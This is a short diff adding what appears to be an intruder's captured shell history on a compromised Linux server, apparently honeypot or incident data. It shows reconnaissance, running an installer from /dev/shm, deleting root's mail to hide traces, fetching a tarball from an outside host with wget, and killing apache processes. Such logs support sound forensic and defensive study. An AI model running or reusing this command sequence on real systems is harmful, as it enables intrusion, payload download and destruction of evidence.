@@ -1,0 +1,15 @@
+id
+uptime
+./inst
+hostname
+hostname sbm79.dtc.apu.edu
+cd /dev/shm/sc
+./install sbm79.dtc.apu.edu
+rm -rf /var/mail/root
+ps x
+cd /tmp
+ls -a
+wget izolam.net/sslstop.tar.gz
+ps x
+ps aux | grep apache
+kill -9  21510  21511 23289  23292 23302
